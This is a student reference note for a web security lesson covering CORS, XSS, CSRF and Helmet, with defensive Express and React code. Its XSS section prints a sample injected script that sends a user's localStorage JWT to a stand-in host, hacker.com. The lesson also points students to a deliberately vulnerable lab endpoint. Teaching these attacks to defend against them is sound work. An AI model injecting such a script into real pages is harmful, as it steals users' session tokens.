# Lesson 32 — Web Security Basics (CORS, XSS, CSRF)
# Student Reference Notes

> **Launch the lab before reading:**
> ```bash
> cd examples/security-api
> pnpm install   # first time only
> pnpm dev
> ```
> Open **http://localhost:3000** — start on the **Concepts** tab.

---

## What This Lesson Is About

In previous lessons, we secured *who* has access to the API using JSON Web Tokens (JWT). Today, we look at securing *how* data enters and leaves our applications. 

Web applications are inherently public. If there is a text box, someone *will* try to type malicious code into it. If you have an API, someone *will* try to hit it from a malicious website.

We will cover the "Big Three" of foundational web security:
1. **CORS (Cross-Origin Resource Sharing)** — Controlling which domains can talk to your API.
2. **XSS (Cross-Site Scripting)** — Stopping hackers from injecting malicious JavaScript into your pages.
3. **CSRF (Cross-Site Request Forgery)** — Stopping hackers from tricking a user's browser into performing actions on their behalf.

---

## 1. CORS: The Strict Bouncer

### The Problem: Same-Origin Policy (SOP)
By default, browsers have a strict rule called the **Same-Origin Policy**. If a user is on `http://my-frontend.com` and Javascript tries to `fetch()` data from `http://my-backend-api.com`, the browser will **block** the request.

Why? Because if you are logged into your bank (`bank.com`), and you visit a malicious website (`evil.com`), you don't want `evil.com`'s Javascript to silently make a background request to `bank.com/transfer` and steal your money.

### The Solution: CORS
But what if you *own* both `my-frontend.com` and `my-backend-api.com`? You *want* them to talk!

**Analogy: The Cross-Border Club**
Imagine a club situated exactly on the border of two countries. The default law (Same-Origin Policy) says "No one from the other country can enter." But the club manager (your API) can give the bouncer (the browser) a specific VIP list: "Actually, let people from *Frontendland* in."

This VIP list is **CORS (Cross-Origin Resource Sharing)**.

```javascript
import cors from 'cors';

// ❌ BAD: The Bouncer lets ANYONE in. (Never do this in production)
app.use(cors()); 

// ✅ GOOD: The Bouncer only lets your specific frontend in.
app.use(cors({
  origin: 'http://localhost:3000', // Or your Vercel/Netlify URL
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true // Allow cookies/authorization headers to be sent
}));
```

When the browser sees the CORS headers coming back from the API (`Access-Control-Allow-Origin: http://localhost:3000`), it allows the request to succeed.

---

## 2. XSS: The Malicious Graffiti Artist

### The Problem
**Cross-Site Scripting (XSS)** happens when an application takes untrusted data (like a user's comment) and sends it back to a web browser without proper validation or escaping.

**Analogy:**
Imagine a public physical bulletin board where people leave post-it notes. A graffiti artist comes along and paints: *"Everyone who reads this board must immediately hand their wallet to the man in the red hat."* If people blindly follow instructions written on the board, they get robbed.

In code, a hacker submits a comment like this:
```html
Great post! <script>
  // Steal the user's JWT token from localStorage and send it to the hacker
  fetch('http://hacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```

If your frontend renders that comment using something like React's `dangerouslySetInnerHTML` or vanilla JS `element.innerHTML`, the browser will literally execute the script!

### The Solution: Output Encoding and Sanitization
1. **Output Encoding:** Modern frameworks like React, Vue, and Angular automatically encode output by default. If you render `{comment.text}`, React turns the `<` into `&lt;`, so it renders as plain text, not executable code.
2. **Sanitization:** Sometimes you *want* to allow users to use rich text (bold, italics). In this case, you must "sanitize" the HTML to strip out `<script>` tags but leave `<b>` tags.

On the backend, you can sanitize data before saving it:
```javascript
import xss from 'xss';

app.post('/api/comments', (req, res) => {
  const rawComment = req.body.text;
  
  // Clean the comment: Removes <script>, onmouseover, etc.
  const safeComment = xss(rawComment); 
  
  db.save(safeComment);
  res.json({ message: "Comment saved safely!" });
});
```

---

## 3. CSRF: The Forged Bank Check

### The Problem
**Cross-Site Request Forgery (CSRF)** forces an end user to execute unwanted actions on a web application in which they're currently authenticated. 

**Analogy:**
Imagine you go to a bank, show your ID, and get a "valid" stamp on your hand. You then walk to a shady cafe next door. The barista slips a forged bank transfer form into your pocket. When you walk back into the bank, the teller sees the valid stamp on your hand, finds the form in your pocket, and processes the transfer without asking you.

In the web world, if you use **Cookies** for authentication, the browser *automatically* sends those cookies with every request to that domain. 
If you are logged into `bank.com`, and visit `evil.com`, and `evil.com` has a hidden form that POSTs to `bank.com/transfer`, your browser will happily attach your `bank.com` auth cookie to the request. The bank thinks YOU initiated the transfer.

### The Solution: SameSite Cookies & Anti-CSRF Tokens
1. **Modern Solution (SameSite):** Modern browsers introduced the `SameSite` attribute for cookies. 
   If you set `SameSite=Lax` or `SameSite=Strict`, the browser will **refuse** to send the cookie if the request originates from a different domain (like `evil.com`). This mitigates 99% of CSRF attacks today.
   
2. **Traditional Solution (Tokens):** The server generates a unique, random string (CSRF Token) and gives it to the frontend. Whenever the frontend makes a state-changing request (POST, PUT, DELETE), it must include this token. Because `evil.com` cannot read the token (due to the Same-Origin Policy!), its forged requests will fail.

---

## 4. Helmet: The Security HardHat

There are dozens of small HTTP headers that tell the browser how to behave securely (e.g., preventing the site from being embedded in an iframe to stop "Clickjacking").

Instead of memorizing them all, we use a middleware called **Helmet**.

```javascript
import helmet from 'helmet';
import express from 'express';

const app = express();

// Instantly adds 14 critical security headers to every response!
app.use(helmet()); 
```

---

## Common Mistakes to Avoid

| Mistake | Consequence | Fix |
|---------|-------------|-----|
| `app.use(cors())` with no options | Any website in the world can make requests to your API. | Explicitly define the `origin` array. |
| Using `innerHTML` on the frontend | Browser executes any `<script>` tags found in the data (XSS). | Use `textContent`, `innerText`, or framework defaults (like React's `{variable}`). |
| Relying on frontend validation only | Hackers bypass the frontend and send XSS payloads directly via Postman. | Always sanitize/validate on the Backend. |

---

## Next Steps

Launch the Interactive Lab (`pnpm dev`) and try out the "Security Lab" tab. Try to execute an XSS attack against the vulnerable endpoint!
